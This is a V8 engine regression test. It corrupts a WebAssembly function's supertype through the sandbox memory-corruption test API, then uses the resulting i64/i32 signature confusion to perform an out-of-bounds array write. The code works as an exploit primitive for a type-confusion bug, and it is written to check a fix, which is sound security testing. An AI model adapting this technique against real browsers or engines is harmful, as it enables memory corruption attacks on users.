// Copyright 2025 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --expose-memory-corruption-api

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmGlobalObjectTaggedBufferOffset = 0x14;
const kFixedArrayElement0Offset = 0x8;
const kMapOffset = 0;
const kFuncRefMapTypeInfoOffset = 0x14;
const kTypeInfoSupertypesOffset = 0x10;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getObj(ofs) {
  return Sandbox.getObjectAt(ofs);
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let builder = new WasmModuleBuilder();

let $u8arr = builder.addArray(kWasmI8, true);
let $sig_i_l = builder.addType(kSig_i_l, kNoSuperType, false);
let $sig_l_l = builder.addType(kSig_l_l, kNoSuperType, false);
let $sig_u8arr_i = builder.addType(makeSig([kWasmI32], [wasmRefType($u8arr)]));
let $sig_i_u8arrl = builder.addType(makeSig([wasmRefType($u8arr), kWasmI64], [kWasmI32]));
let $sig_v_u8arrli = builder.addType(makeSig([wasmRefType($u8arr), kWasmI64, kWasmI32], []));

builder.addFunction('fn_i_l', $sig_i_l).addBody([
  ...wasmI32Const(0),
]).exportFunc();
let $fn_l_l = builder.addFunction('fn_l_l', $sig_l_l).addBody([
  kExprLocalGet, 0,
]).exportFunc();
let $t = builder.addTable(kWasmAnyFunc, 1, 1, [kExprRefFunc, ...wasmSignedLeb($fn_l_l.index)]);

builder.addFunction('alloc_u8arr', $sig_u8arr_i).addBody([
  kExprLocalGet, 0,
  kGCPrefix, kExprArrayNewDefault, $u8arr,
]).exportFunc();

builder.addFunction(`u8arr_get`, $sig_i_u8arrl).addBody([
  kExprLocalGet, 0,
  kExprLocalGet, 1,                                     // i64 index
  ...wasmI32Const(0),                                   // confuse i64 into i32 with a signature hash compatible function (i64->i64 vs i64->i32)
  kExprCallIndirect, ...wasmSignedLeb($sig_i_l), ...wasmSignedLeb($t.index),
  kGCPrefix, kExprArrayGetU, ...wasmSignedLeb($u8arr),  // array indexing, uses full 64bit regs as is on x86-64 (+ kWasmI8 avoids i32 shl)
]).exportFunc();

builder.addFunction(`u8arr_set`, $sig_v_u8arrli).addBody([
  kExprLocalGet, 0,

  kExprLocalGet, 1,
  ...wasmI32Const(0),
  kExprCallIndirect, ...wasmSignedLeb($sig_i_l), ...wasmSignedLeb($t.index),
  kExprLocalGet, 2,
  kGCPrefix, kExprArraySet, ...wasmSignedLeb($u8arr),
]).exportFunc();

let instance = builder.instantiate();
let {fn_i_l, fn_l_l, alloc_u8arr, u8arr_get, u8arr_set} = instance.exports;

function extract_wasmglobal_value(global) {
  let pbuf = getField(getPtr(global), kWasmGlobalObjectTaggedBufferOffset);
  let pval = getField(pbuf, kFixedArrayElement0Offset);
  return pval;
}

function set_supertype(sub_fn, super_fn) {
  let g = new WebAssembly.Global({value: 'anyfunc', mutable: true});

  g.value = sub_fn;
  let funcref_sub = extract_wasmglobal_value(g);                    // WASM_FUNC_REF_TYPE
  let map_sub = getField(funcref_sub, kMapOffset);                  // Map of WASM_FUNC_REF_TYPE
  let typeinfo_sub = getField(map_sub, kFuncRefMapTypeInfoOffset);  // WASM_TYPE_INFO_TYPE

  g.value = super_fn;
  let funcref_sup = extract_wasmglobal_value(g);
  let map_sup = getField(funcref_sup, kMapOffset);

  // typeinfo_sub.supertypes[0] = map_sup
  setField(typeinfo_sub, kTypeInfoSupertypesOffset, map_sup);
}

// set $sig_l_l <: $sig_i_l
set_supertype(fn_l_l, fn_i_l);

// alloc u8arr of length 0x100000.
let u8arr = alloc_u8arr(0x100000);

// oob write
let MASK64 = (1n<<64n)-1n;
function write8(ptr, val) {
  u8arr_set(u8arr, ptr & MASK64, val);
}
// Try to write at a huge offset; this should get truncated to 32-bit and
// succeed.
write8(0x424200012345n, 0x43);
